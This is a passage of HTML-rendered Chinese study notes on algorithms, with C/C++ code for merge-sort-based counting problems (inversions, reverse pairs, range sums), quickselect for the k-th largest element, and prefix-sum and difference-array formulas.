class="hljs-number">2</span>, <span class="hljs-number">5</span>&#125;, &#123;<span class="hljs-number">3</span>, <span class="hljs-number">6</span>&#125;, &#123;<span class="hljs-number">4</span>, <span class="hljs-number">7</span>&#125;, &#123;<span class="hljs-number">5</span>, <span class="hljs-number">8</span>&#125; &#125;;<br>    <span class="hljs-type">int</span> result = maxOverlapSegments(segments);<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;最大重叠的线段数: &quot;</span> &lt;&lt; result &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h3 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h3><ul><li>时间复杂度：O(n log n)</li><li>空间复杂度：O(n)</li><li>稳定性：稳定</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">merge_sort</span><span class="hljs-params">(<span class="hljs-type">int</span> q[], <span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r)</span></span>&#123;<br>    <span class="hljs-type">int</span> temp[<span class="hljs-number">1000</span>];<br>    <span class="hljs-keyword">if</span> (l &gt;= r) <span class="hljs-keyword">return</span>;<br>    <span class="hljs-type">int</span> mid = l + r &gt;&gt; <span class="hljs-number">1</span>;<br>    <span class="hljs-built_in">merge_sort</span>(q, l, mid);<br>    <span class="hljs-built_in">merge_sort</span>(q, mid + <span class="hljs-number">1</span>, r);<br>    <span class="hljs-type">int</span> k = <span class="hljs-number">0</span>, i = l, j = mid + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (i &lt;= mid &amp;&amp; j &lt;= r)<br>        <span class="hljs-keyword">if</span> (q[i] &lt; q[j]) tmp[k ++ ] = q[i ++ ];<br>        <span class="hljs-keyword">else</span> tmp[k ++ ] = q[j ++ ];<br>    <span class="hljs-keyword">while</span> (i &lt;= mid) tmp[k ++ ] = q[i ++ ];<br>    <span class="hljs-keyword">while</span> (j &lt;= r) tmp[k ++ ] = q[j ++ ];<br>    <span class="hljs-keyword">for</span> (i = l, j = <span class="hljs-number">0</span>; i &lt;= r; i ++, j ++ ) q[i] = tmp[j];<br>&#125;<br></code></pre></td></tr></table></figure><p>在合并的过程中，我们不仅可以 <strong>排序</strong>，还可以 <strong>统计</strong> 数组中元素之间的关系,在每层merge前统计关系</p><h4 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h4><h5 id="小和问题"><a href="#小和问题" class="headerlink" title="小和问题"></a>小和问题</h5><p>统计左面有多少数比本身小累加起来</p><p>merge过程中设置一个ans，当左组拷贝时ans+右组指针到结尾的数的个数*拷贝的数，相等时先拷贝右边</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">merge_sort</span><span class="hljs-params">(<span class="hljs-type">int</span> q[], <span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r)</span>&#123;<br>    <span class="hljs-type">int</span> temp[<span class="hljs-number">1000</span>];<br>    <span class="hljs-keyword">if</span> (l &gt;= r) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> mid = l + r &gt;&gt; <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> res = <span class="hljs-number">0</span>;<br>    res += merge_sort(q, l, mid);<br>    res += merge_sort(q, mid + <span class="hljs-number">1</span>, r);<br>    <span class="hljs-type">int</span> k = <span class="hljs-number">0</span>, i = l, j = mid + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (i &lt;= mid &amp;&amp; j &lt;= r)<br>        <span class="hljs-keyword">if</span> (q[i] &lt; q[j])&#123;     <br>            tmp[k ++ ] = q[i ++ ];<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123; <br>            tmp[k ++ ] = q[j ++ ];<br>        &#125;<br>    <span class="hljs-keyword">while</span> (i &lt;= mid) tmp[k ++ ] = q[i ++ ];<br>    <span class="hljs-keyword">while</span> (j &lt;= r) tmp[k ++ ] = q[j ++ ];<br>    <span class="hljs-keyword">for</span> (i = l, j = <span class="hljs-number">0</span>; i &lt;= r; i ++, j ++ ) q[i] = tmp[j];<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="逆序对问题"><a href="#逆序对问题" class="headerlink" title="逆序对问题"></a>逆序对问题</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 归并排序计算逆序对</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">merge_sort</span><span class="hljs-params">(<span class="hljs-type">int</span> q[], <span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r)</span> &#123;<br>    <span class="hljs-type">int</span> temp[<span class="hljs-number">1000</span>];  <span class="hljs-comment">// 临时数组</span><br>    <span class="hljs-keyword">if</span> (l &gt;= r) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">// 递归的终止条件</span><br>    <br>    <span class="hljs-type">int</span> mid = (l + r) &gt;&gt; <span class="hljs-number">1</span>;  <span class="hljs-comment">// 找到中点</span><br>    <span class="hljs-type">int</span> res = <span class="hljs-number">0</span>;  <span class="hljs-comment">// 统计逆序对的结果</span><br>    <br>    <span class="hljs-comment">// 递归调用归并排序，处理左右两部分</span><br>    res += merge_sort(q, l, mid);<br>    res += merge_sort(q, mid + <span class="hljs-number">1</span>, r);<br>    <br>    <span class="hljs-comment">// 合并过程中，统计符合条件的逆序对</span><br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">tmp</span><span class="hljs-params">(r - l + <span class="hljs-number">1</span>)</span>;  <span class="hljs-comment">// 临时数组，大小为归并后数组的大小</span><br>    <span class="hljs-type">int</span> k = <span class="hljs-number">0</span>, i = l, j = mid + <span class="hljs-number">1</span>;<br><br>    <span class="hljs-comment">// 统计符合条件的数 (逆序对)</span><br>    <span class="hljs-keyword">for</span> (i = l; i &lt;= mid; i++) &#123;<br>        <span class="hljs-keyword">while</span> (j &lt;= r &amp;&amp; q[i] &gt; q[j]) &#123;  <span class="hljs-comment">// 比较左右两部分的元素</span><br>            j++;  <span class="hljs-comment">// 找到所有满足条件的右侧元素</span><br>        &#125;<br>        res += (j - (mid + <span class="hljs-number">1</span>));  <span class="hljs-comment">// 累加逆序对</span><br>    &#125;<br><br>    <span class="hljs-comment">// 合并过程</span><br>    i = l;  <span class="hljs-comment">// 重置 i 和 j 用于合并操作</span><br>    j = mid + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (i &lt;= mid &amp;&amp; j &lt;= r) &#123;<br>        <span class="hljs-keyword">if</span> (q[i] &lt;= q[j]) &#123;<br>            tmp[k++] = q[i++];  <span class="hljs-comment">// 左边的元素较小</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            tmp[k++] = q[j++];  <span class="hljs-comment">// 右边的元素较小</span><br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 将剩余元素放入临时数组</span><br>    <span class="hljs-keyword">while</span> (i &lt;= mid) tmp[k++] = q[i++];<br>    <span class="hljs-keyword">while</span> (j &lt;= r) tmp[k++] = q[j++];<br><br><br>    <span class="hljs-comment">// 将临时数组的元素拷贝回原数组</span><br>    <span class="hljs-keyword">for</span> (i = l, j = <span class="hljs-number">0</span>; i &lt;= r; i++, j++) &#123;<br>        q[i] = tmp[j];<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> res;  <span class="hljs-comment">// 返回当前统计的结果</span><br>&#125;<br><br><br></code></pre></td></tr></table></figure><h5 id="自定义问题"><a href="#自定义问题" class="headerlink" title="自定义问题"></a>自定义问题</h5><p>num的右边有多少个数*2之后依然&lt;num 这个方案设计了R来让其滑动窗口</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 归并排序计算逆序对</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">merge_sort</span><span class="hljs-params">(<span class="hljs-type">int</span> q[], <span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r)</span> &#123;<br>    <span class="hljs-type">int</span> temp[<span class="hljs-number">1000</span>];  <span class="hljs-comment">// 临时数组</span><br>    <span class="hljs-keyword">if</span> (l &gt;= r) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">// 递归的终止条件</span><br>    <br>    <span class="hljs-type">int</span> mid = (l + r) &gt;&gt; <span class="hljs-number">1</span>;  <span class="hljs-comment">// 找到中点</span><br>    <span class="hljs-type">int</span> res = <span class="hljs-number">0</span>;  <span class="hljs-comment">// 统计逆序对的结果</span><br>    <br>    <span class="hljs-comment">// 递归调用归并排序，处理左右两部分</span><br>    res += merge_sort(q, l, mid);<br>    res += merge_sort(q, mid + <span class="hljs-number">1</span>, r);<br>    <br>    <span class="hljs-comment">// 合并过程中，统计符合条件的逆序对</span><br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">tmp</span><span class="hljs-params">(r - l + <span class="hljs-number">1</span>)</span>;  <span class="hljs-comment">// 临时数组，大小为归并后数组的大小</span><br>    <span class="hljs-type">int</span> k = <span class="hljs-number">0</span>, i = l, j = mid + <span class="hljs-number">1</span>;<br><br>    <span class="hljs-comment">// 统计符合条件的数 (逆序对)</span><br>    <span class="hljs-keyword">for</span> (i = l; i &lt;= mid; i++) &#123;<br>        <span class="hljs-comment">// 对于每个 q[i]，寻找右侧所有 q[j] 满足 q[i] &gt; 2 * q[j]</span><br>        <span class="hljs-comment">// 这里我们实现了一个滑动窗口，j 从 mid+1 开始，并向右滑动</span><br>        <span class="hljs-keyword">while</span> (j &lt;= r &amp;&amp; (<span class="hljs-type">long</span>)q[i] &gt; (<span class="hljs-type">long</span>)q[j] * <span class="hljs-number">2</span>) &#123;<br>            j++;  <span class="hljs-comment">// 右侧元素大于 q[i] * 2 的个数</span><br>        &#125;<br>        res += (j - (mid + <span class="hljs-number">1</span>));  <span class="hljs-comment">// 累加逆序对的个数</span><br>    &#125;<br><br>    <span class="hljs-comment">// 合并过程</span><br>    i = l;  <span class="hljs-comment">// 重置 i 和 j 用于合并操作</span><br>    j = mid + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (i &lt;= mid &amp;&amp; j &lt;= r) &#123;<br>        <span class="hljs-keyword">if</span> (q[i] &lt;= q[j]) &#123;<br>            tmp[k++] = q[i++];  <span class="hljs-comment">// 左边的元素较小</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            tmp[k++] = q[j++];  <span class="hljs-comment">// 右边的元素较小</span><br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 将剩余元素放入临时数组</span><br>    <span class="hljs-keyword">while</span> (i &lt;= mid) tmp[k++] = q[i++];<br>    <span class="hljs-keyword">while</span> (j &lt;= r) tmp[k++] = q[j++];<br><br>    <span class="hljs-comment">// 将临时数组的元素拷贝回原数组</span><br>    <span class="hljs-keyword">for</span> (i = l, j = <span class="hljs-number">0</span>; i &lt;= r; i++, j++) &#123;<br>        q[i] = tmp[j];<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> res;  <span class="hljs-comment">// 返回当前统计的结果</span><br>&#125;<br><br></code></pre></td></tr></table></figure><h5 id="比较一个区间的问题"><a href="#比较一个区间的问题" class="headerlink" title="比较一个区间的问题"></a>比较一个区间的问题</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 合并排序计算区间和在 [lower, upper] 范围内的数量</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">merge_sort</span><span class="hljs-params">(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r, <span class="hljs-type">int</span> lower, <span class="hljs-type">int</span> upper)</span> &#123;<br>    <span class="hljs-keyword">if</span> (l &gt;= r) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-type">int</span> mid = (l + r) &gt;&gt; <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> res = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">// 递归调用归并排序，统计左半部分和右半部分</span><br>    res += merge_sort(nums, l, mid, lower, upper);<br>    res += merge_sort(nums, mid + <span class="hljs-number">1</span>, r, lower, upper);<br><br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">tmp</span><span class="hljs-params">(r - l + <span class="hljs-number">1</span>)</span>;<br>    <span class="hljs-type">int</span> i = l, j = mid + <span class="hljs-number">1</span>, k = <span class="hljs-number">0</span>;<br>    <br>    <span class="hljs-comment">// 统计符合条件的数 (区间和在 lower, upper 范围内)</span><br>    <span class="hljs-type">int</span> windowL = l;<br>    <span class="hljs-type">int</span> windowR = l;<br>    <br>    <span class="hljs-keyword">for</span> (i = j; i &lt;= r; i++) &#123;<br>        <span class="hljs-type">long</span> min_val = nums[i] - upper;<br>        <span class="hljs-type">long</span> max_val = nums[i] - lower;<br><br>        <span class="hljs-keyword">while</span> (windowR &lt;= mid &amp;&amp; nums[windowR] &lt;= max_val) &#123;<br>            windowR++;<br>        &#125;<br>        <span class="hljs-keyword">while</span> (windowL &lt;= mid &amp;&amp; nums[windowL] &lt; min_val) &#123;<br>            windowL++;<br>        &#125;<br><br>        res += windowR - windowL;<br>    &#125;<br><br>    <span class="hljs-comment">// 合并过程</span><br>    i = l;<br>    j = mid + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (i &lt;= mid &amp;&amp; j &lt;= r) &#123;<br>        <span class="hljs-keyword">if</span> (nums[i] &lt;= nums[j]) &#123;<br>            tmp[k++] = nums[i++];<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            tmp[k++] = nums[j++];<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 将剩余元素放入临时数组</span><br>    <span class="hljs-keyword">while</span> (i &lt;= mid) tmp[k++] = nums[i++];<br>    <span class="hljs-keyword">while</span> (j &lt;= r) tmp[k++] = nums[j++];<br><br>    <span class="hljs-comment">// 将临时数组的元素拷贝回原数组</span><br>    <span class="hljs-keyword">for</span> (i = l, k = <span class="hljs-number">0</span>; i &lt;= r; i++, k++) &#123;<br>        nums[i] = tmp[k];<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> res;  <span class="hljs-comment">// 返回当前统计的结果</span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="查找第-k-大元素"><a href="#查找第-k-大元素" class="headerlink" title="查找第 k 大元素"></a>查找第 <code>k</code> 大元素</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">findKthLargest</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> k)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">quickSort</span>(nums, <span class="hljs-number">0</span>, nums.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>, nums.<span class="hljs-built_in">size</span>() - k);<br>    &#125;<br><br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-comment">// quickSort 函数：用于查找在排序后位置为 index 的元素的值</span><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">quickSort</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; arr, <span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r, <span class="hljs-type">int</span> index)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (l &gt;= r) <span class="hljs-keyword">return</span> arr[l];<br>        <span class="hljs-type">int</span> pivot = <span class="hljs-built_in">partition</span>(arr, l, r);<br>        <span class="hljs-keyword">if</span> (index == pivot) <span class="hljs-keyword">return</span> arr[pivot];<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (index &lt; pivot) <span class="hljs-keyword">return</span> <span class="hljs-built_in">quickSort</span>(arr, l, pivot - <span class="hljs-number">1</span>, index);<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-built_in">quickSort</span>(arr, pivot + <span class="hljs-number">1</span>, r, index);<br>    &#125;<br><br>    <span class="hljs-comment">// partition 函数：分区操作，返回分区位置</span><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">partition</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; a, <span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r)</span> </span>&#123;<br>        <span class="hljs-type">int</span> pivot = l + <span class="hljs-built_in">rand</span>() % (r - l + <span class="hljs-number">1</span>);<br>        <span class="hljs-type">int</span> pivotVal = a[pivot];<br><br>        <span class="hljs-keyword">while</span> (l &lt;= r) &#123;<br>            <span class="hljs-keyword">while</span> (a[l] &lt; pivotVal) l++;<br>            <span class="hljs-keyword">while</span> (a[r] &gt; pivotVal) r--;<br>            <span class="hljs-keyword">if</span> (l == r) <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">if</span> (l &lt; r) &#123;<br>                <span class="hljs-type">int</span> temp = a[l];<br>                a[l] = a[r];<br>                a[r] = temp;<br>                l++;<br>                r--;<br>            &#125;<br>        &#125;<br>        <br>        <span class="hljs-keyword">return</span> r;<br>    &#125;<br>&#125;;<br><br></code></pre></td></tr></table></figure><h4 id="翻转对"><a href="#翻转对" class="headerlink" title="翻转对"></a>翻转对</h4><p>题目要求在一个数组中找到满足条件 <code>nums[i] &gt; 2 * nums[j]</code> 的所有下标对 <code>(i, j)</code>，其中 <code>i &lt; j</code>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">reversePairs</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        ans = <span class="hljs-number">0</span>;<br>        <span class="hljs-built_in">mergeSort</span>(nums, <span class="hljs-number">0</span>, nums.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br><br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-type">int</span> ans;  <span class="hljs-comment">// 全局变量，记录翻转对数量</span><br><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">mergeSort</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; arr, <span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (l &gt;= r) <span class="hljs-keyword">return</span>;<br>        <span class="hljs-type">int</span> mid = (l + r) / <span class="hljs-number">2</span>;<br>        <span class="hljs-built_in">mergeSort</span>(arr, l, mid);<br>        <span class="hljs-built_in">mergeSort</span>(arr, mid + <span class="hljs-number">1</span>, r);<br>        <span class="hljs-built_in">calculate</span>(arr, l, mid, r);<br>        <span class="hljs-built_in">merge</span>(arr, l, mid, r);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">calculate</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; arr, <span class="hljs-type">int</span> left, <span class="hljs-type">int</span> mid, <span class="hljs-type">int</span> right)</span> </span>&#123;<br>        <span class="hljs-type">int</span> j = mid + <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = left; i &lt;= mid; i++) &#123;<br>            <span class="hljs-keyword">while</span> (j &lt;= right &amp;&amp; arr[i] &gt; <span class="hljs-number">2LL</span> * arr[j]) j++;<br>            ans += j - (mid + <span class="hljs-number">1</span>);  <span class="hljs-comment">// 累加符合条件的对数</span><br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">merge</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; arr, <span class="hljs-type">int</span> left, <span class="hljs-type">int</span> mid, <span class="hljs-type">int</span> right)</span> </span>&#123;<br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">temp</span><span class="hljs-params">(right - left + <span class="hljs-number">1</span>)</span></span>;<br>        <span class="hljs-type">int</span> i = left, j = mid + <span class="hljs-number">1</span>, k = <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">while</span> (i &lt;= mid &amp;&amp; j &lt;= right) &#123;<br>            <span class="hljs-keyword">if</span> (arr[i] &lt;= arr[j]) temp[k++] = arr[i++];<br>            <span class="hljs-keyword">else</span> temp[k++] = arr[j++];<br>        &#125;<br>        <span class="hljs-keyword">while</span> (i &lt;= mid) temp[k++] = arr[i++];<br>        <span class="hljs-keyword">while</span> (j &lt;= right) temp[k++] = arr[j++];<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; temp.<span class="hljs-built_in">size</span>(); i++) arr[left + i] = temp[i];<br>    &#125;<br>&#125;;<br><br></code></pre></td></tr></table></figure><h2 id="三-前缀和"><a href="#三-前缀和" class="headerlink" title="三.前缀和"></a>三.前缀和</h2><p>一维前缀和<br>S[i] &#x3D; a[1] + a[2] + … a[i]<br>a[l] + … + a[r] &#x3D; S[r] - S[l - 1]</p><p>一维差分<br>给区间[l, r]中的每个数加上c：B[l] +&#x3D; c, B[r + 1] -&#x3D; c</p><p>二维前缀和<br>S[i, j] &#x3D; 第i行j列格子左上部分所有元素的和<br>以(x1, y1)为左上角，(x2, y2)为右下角的子矩阵的和为：<br>S[x2, y2] - S[x1 - 1, y2] - S[x2, y1 - 1] + S[x1 - 1, y1 - 1]</p><p>二维差分<br>给以(x1, y1)为左上角，(x2, y2)为右下角的子矩阵中的所有元素加上c：<br>S[x1, y1] +&#x3D; c, S[x2 + 1, y1] -&#x3D; c, S[x1, y2 + 1] -&#x3D; c, S[x2 + 1, y2 + 1] +&#x3D; c</p><h3 id="一维前缀和"><a href="#一维前缀和" class="headerlink" title="一维前缀和"></a>一维前缀和</h3><p>定义：前缀和数组是用于快速计算数组任意区间和的辅助数组。<code>S[i]</code> 表示从数组开头到第 <code>i</code> 个元素的累加和。</p><p>公式：</p><ul><li>基本公式：<code>S[i] = S[i-1] + A[i]</code></li><li>区间和公式：要计算原数组 <code>A</code> 中 <code>[i, j]</code> 区间的和，可以使用前缀和数组：<code>sum(i, j) = S[j] - S[i-1]</code>  用x,y模拟s[x]-s[y]此时只需要遍历x的位置。</li></ul><p>[3, 1, 4, 5, 2]</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 